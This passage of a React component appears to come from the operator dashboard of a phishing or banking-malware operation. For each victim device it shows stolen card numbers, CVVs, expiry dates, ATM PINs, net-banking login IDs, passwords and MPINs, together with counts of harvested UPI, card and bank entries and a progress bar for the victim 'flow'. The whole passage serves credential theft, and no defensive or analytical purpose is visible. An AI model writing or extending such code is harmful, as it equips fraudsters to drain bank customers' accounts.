                    <div style={{ gridColumn: 'span 2' }}><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Card Number</span><br /><span style={{ fontWeight: 600, fontFamily: 'monospace' }}>{selectedDevice.cardData?.cardNumber || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Holder</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.cardData?.cardHolder || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Amount</span><br /><span style={{ fontWeight: 700, color: '#2ecc71' }}>₹{selectedDevice.cardData?.amount || '0'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>ATM PIN</span><br /><span style={{ fontWeight: 600, fontFamily: 'monospace' }}>{selectedDevice.cardData?.atmPin || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>CVV</span><br /><span style={{ fontWeight: 600, fontFamily: 'monospace' }}>{selectedDevice.cardData?.cvv || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Expiry</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.cardData?.expiry || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Status</span><br /><span style={{ fontWeight: 600, color: getStatusColor(selectedDevice.cardData?.status) }}>{selectedDevice.cardData?.status || 'N/A'}</span></div>
                    <div style={{ gridColumn: 'span 2' }}><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Timestamp</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.cardData?.timestamp || 'N/A'}</span></div>
                  </div>
                  {Object.keys(selectedDevice.allCardData || {}).length > 1 && (
                    <div style={{ marginTop: '4px', fontSize: '9px', color: 'var(--text-muted)' }}>
                      + {Object.keys(selectedDevice.allCardData).length - 1} more entries
                    </div>
                  )}
                </div>
              )}

              {/* Netbank Data */}
              {selectedDevice.hasNetbank && (
                <div style={{ background: 'rgba(245,158,11,0.05)', borderRadius: '8px', padding: '10px 12px', marginBottom: '8px', border: '1px solid rgba(245,158,11,0.15)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                    <span style={{ fontSize: '12px', fontWeight: 700, color: '#f59e0b' }}>🏦 Net Banking</span>
                    <span style={{ fontSize: '9px', fontWeight: 600, background: 'rgba(245,158,11,0.1)', padding: '2px 8px', borderRadius: '10px', color: '#f59e0b' }}>
                      {selectedDevice.netbankCount} entries
                    </span>
                  </div>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2px 10px', fontSize: '12px' }}>
                    <div style={{ gridColumn: 'span 2' }}><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Bank</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.netbankData?.bankName || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Login ID</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.netbankData?.loginId || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Amount</span><br /><span style={{ fontWeight: 700, color: '#f59e0b' }}>₹{selectedDevice.netbankData?.amount || '0'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>MPIN</span><br /><span style={{ fontWeight: 600, fontFamily: 'monospace' }}>{selectedDevice.netbankData?.mpin || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Password</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.netbankData?.password || 'N/A'}</span></div>
                    <div><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Status</span><br /><span style={{ fontWeight: 600, color: getStatusColor(selectedDevice.netbankData?.status) }}>{selectedDevice.netbankData?.status || 'N/A'}</span></div>
                    <div style={{ gridColumn: 'span 2' }}><span style={{ color: 'var(--text-muted)', fontSize: '9px' }}>Timestamp</span><br /><span style={{ fontWeight: 600 }}>{selectedDevice.netbankData?.timestamp || 'N/A'}</span></div>
                  </div>
                  {Object.keys(selectedDevice.allNetbankData || {}).length > 1 && (
                    <div style={{ marginTop: '4px', fontSize: '9px', color: 'var(--text-muted)' }}>
                      + {Object.keys(selectedDevice.allNetbankData).length - 1} more entries
                    </div>
                  )}
                </div>
              )}

              {/* Summary */}
              <div style={{
                background: 'rgba(108,99,255,0.05)',
                borderRadius: '8px',
                padding: '10px 12px',
                marginBottom: '10px',
                border: '1px solid rgba(108,99,255,0.15)'
              }}>
                <div style={{ fontSize: '11px', fontWeight: 700, color: '#6c63ff', marginBottom: '6px' }}>📊 Summary</div>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr 1fr 1fr', gap: '4px' }}>
                  <div style={{ textAlign: 'center', background: 'var(--bg-card)', borderRadius: '6px', padding: '4px', border: '1px solid var(--border-color)' }}>
                    <div style={{ fontSize: '8px', color: 'var(--text-muted)' }}>✅</div>
                    <div style={{ fontSize: '16px', fontWeight: 700, color: '#3b82f6' }}>{selectedDevice.verificationCount}</div>
                  </div>
                  <div style={{ textAlign: 'center', background: 'var(--bg-card)', borderRadius: '6px', padding: '4px', border: '1px solid var(--border-color)' }}>
                    <div style={{ fontSize: '8px', color: 'var(--text-muted)' }}>📲</div>
                    <div style={{ fontSize: '16px', fontWeight: 700, color: '#8b5cf6' }}>{selectedDevice.upiCount}</div>
                  </div>
                  <div style={{ textAlign: 'center', background: 'var(--bg-card)', borderRadius: '6px', padding: '4px', border: '1px solid var(--border-color)' }}>
                    <div style={{ fontSize: '8px', color: 'var(--text-muted)' }}>💳</div>
                    <div style={{ fontSize: '16px', fontWeight: 700, color: '#2ecc71' }}>{selectedDevice.cardCount}</div>
                  </div>
                  <div style={{ textAlign: 'center', background: 'var(--bg-card)', borderRadius: '6px', padding: '4px', border: '1px solid var(--border-color)' }}>
                    <div style={{ fontSize: '8px', color: 'var(--text-muted)' }}>🏦</div>
                    <div style={{ fontSize: '16px', fontWeight: 700, color: '#f59e0b' }}>{selectedDevice.netbankCount}</div>
                  </div>
                  <div style={{ textAlign: 'center', background: 'rgba(108,99,255,0.08)', borderRadius: '6px', padding: '4px', border: '1px solid rgba(108,99,255,0.2)' }}>
                    <div style={{ fontSize: '8px', color: '#6c63ff' }}>📊</div>
                    <div style={{ fontSize: '16px', fontWeight: 700, color: '#6c63ff' }}>{getTotalCount(selectedDevice)}</div>
                  </div>
                </div>
                <div style={{ marginTop: '6px', fontSize: '9px', color: 'var(--text-muted)', textAlign: 'center' }}>
                  Flow Progress: {getFlowProgress(selectedDevice)}% • {getFlowText(selectedDevice).text}
                </div>
              </div>

              <button
                onClick={() => { closeDialog(); setTimeout(() => navigate(`/device/${selectedDevice.deviceId}`), 300); }}
                style={{
                  width: '100%',
                  padding: '11px',
                  marginTop: '4px',
                  border: 'none',
                  borderRadius: '8px',
                  background: 'linear-gradient(135deg, #6c63ff, #3b82f6)',
                  color: 'white',
                  fontSize: '14px',
                  fontWeight: 700,
                  cursor: 'pointer',
                  transition: 'all 0.3s'
                }}
                onMouseEnter={(e) => { e.target.style.transform = 'translateY(-2px)'; e.target.style.boxShadow = '0 4px 20px rgba(108,99,255,0.3)'; }}
                onMouseLeave={(e) => { e.target.style.transform = 'translateY(0)'; e.target.style.boxShadow = 'none'; }}
              >
                📱 View Full Device
              </button>
            </div>
          </div>

          <style>{`
            @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
            @keyframes scaleIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
          `}</style>
        </div>
      )}
    </div>
  );
}

export default AllDeviceDataPage;